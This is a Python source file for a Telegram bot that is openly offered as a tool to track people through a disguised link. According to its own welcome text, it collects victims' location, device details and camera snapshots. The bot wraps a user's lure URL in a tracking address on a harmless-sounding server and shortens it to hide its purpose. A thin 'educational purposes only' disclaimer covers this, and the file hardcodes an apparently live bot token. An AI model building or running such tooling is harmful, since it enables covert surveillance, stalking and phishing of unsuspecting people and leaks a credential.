import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import urllib.parse
import urllib.request
import base64
from flask import Flask
from threading import Thread

TOKEN = '8840717306:AAFnJ695LhZEm8kZOPdMyxHHE2EOselmxec'

CHANNEL_USERNAME = '@DARKHACKER1230'

CUSTOM_MESSAGE = """WELCOME 黑暗黑客 !
YOU CAN USE THIS BOT 🤖 TO TRACK PEOPLE JUST THROUGH A SIMPLE LINK 🔗.
IT CAN GATHER INFORMATIONS LIKE LOCATION 📍, DEVICE INFO 📱, CAMERA SNAPS 📷.

JOIN OUR CHANNELS TO USE THIS BOT 🤖. AFTER JOINING CHANNELS CLICK ON JOINED BUTTON TO CONTINUE."""

TERMS_MESSAGE = """✅TERMS AND CONDITIONS✅
1.THE DARK HACKER 1230 BOT IS INTENDED FOR EDUCATIONAL PURPOSES ONLY AND SHOULD NOT BE USED FOR ANY UNETHICAL OR ILLEGAL ACTIVITIES.
2. USERS OF THE DARK HACKER 1230 BOT ARE SOLELY RESPONSIBLE FOR THEIR OWN ACTIONS.
3. IF YOU USE THE DARK HACKER 1230 BOT FOR ANY ILLEGAL OR UNETHICAL ACTIVITIES, YOU DO SO AT YOUR OWN RISK.

IF YOU ARE AGREE WITH OUR TERMS , CLICK ON BUTTON BELOW.
👇👇👇👇👇👇"""

SUCCESS_MESSAGE = """THANK YOU 🙏 FOR ACCEPTING OUR TERMS AND CONDITIONS.
TO CREATE A NEW LINK,
CLICK THE "CREATE LINK" BUTTON BELOW.
👇👇👇👇👇👇"""

bot = telebot.TeleBot(TOKEN)
user_state = {}

# ✅ SERVER KA URL - YAHI APNA ACTUAL URL DAALO
SERVER_URL = "https://online-notes-hub.onrender.com"

def create_short_code(long_url):
    """Server se short code generate karo (6 digit)"""
    try:
        api_url = f"{SERVER_URL}/shorten?url={urllib.parse.quote(long_url)}"
        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as response:
            short_code = response.read().decode('utf-8').strip()
            # ✅ CHHOTA LINK: https://server.com/s/abc123
            return f"{SERVER_URL}/s/{short_code}"
    except Exception as e:
        print(f"Shorten error: {e}")
        return long_url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        bot.get_chat_member(CHANNEL_USERNAME, message.from_user.id)
        ask_to_join(message.chat.id)
    except:
        ask_to_join(message.chat.id)

def ask_to_join(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("JOIN CHANNEL ↗", url=f"https://t.me/{CHANNEL_USERNAME.replace('@','')}"))
    markup.add(InlineKeyboardButton("JOINED", callback_data="check_join"))
    bot.send_message(chat_id, CUSTOM_MESSAGE, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_query(call):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, call.from_user.id)
        if member.status in ['member', 'administrator', 'creator']:
            bot.answer_callback_query(call.id, "Successfully joined!")
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("ACCEPT TERMS AND CONDITIONS", callback_data="accept_terms"))
            bot.send_message(call.message.chat.id, TERMS_MESSAGE, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "You have not joined the channel yet!", show_alert=True)
    except:
        bot.answer_callback_query(call.id, "Please join the channel first!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "accept_terms")
def accept_terms_query(call):
    bot.answer_callback_query(call.id, "Terms Accepted Successfully!")
    send_create_link_menu(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "create_new_link")
def create_new_link_query(call):
    bot.answer_callback_query(call.id, "Please send your URL")
    bot.send_message(call.message.chat.id, "🌐 Enter Your URL")
    user_state[call.from_user.id] = "waiting_for_link"

def send_create_link_menu(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("CREATE LINK 🔗", callback_data="create_new_link"))
    bot.send_message(chat_id, SUCCESS_MESSAGE, reply_markup=markup)

@bot.message_handler(func=lambda message: user_state.get(message.from_user.id) == "waiting_for_link")
def handle_user_link(message):
    user_link = message.text.strip()
    creator_id = message.from_user.id
    user_state[message.from_user.id] = None
    
    try:
        encoded_bytes = base64.b64encode(user_link.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        
        # ✅ TRACKING URL (lambada wala - actual tracker page)
        tracking_url = f"{SERVER_URL}/go/{encoded_str}/{creator_id}"
        
        # ✅ SHORT URL (server se 6 digit code leke)
        short_link = create_short_code(tracking_url)
        
        response_text = f"""✅ NEW LINK CREATED SUCCESSFULLY!
URL: {user_link}

🔗 YOUR SHORT LINK (CHHOTA - DIRECT OPEN HOGA):
{short_link}

DEV - DarkHacker1230 🕷"""

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("CREATE NEW LINK 🔗", callback_data="create_new_link"))
        bot.send_message(message.chat.id, response_text, reply_markup=markup)
        
    except Exception as e:
        bot.send_message(message.chat.id, "❌ Invalid URL format! Please try again.")
        user_state[message.from_user.id] = "waiting_for_link"

@bot.message_handler(commands=['help'])
def send_help(message):
    bot.reply_to(message, "SEND /create TO BEGIN.\n\nOWNER - @darkhacker1230")

@bot.message_handler(commands=['create'])
def create_link(message):
    user_state[message.from_user.id] = "waiting_for_link"
    bot.reply_to(message, "🔗 Please send the URL you want to use for tracking:")

# Flask keep-alive
app = Flask('')
@app.route('/')
def home():
    return "I am alive!"
def run():
    app.run(host='0.0.0.0', port=8080)
def keep_alive():
    t = Thread(target=run)
    t.start()
keep_alive()

bot.infinity_polling()
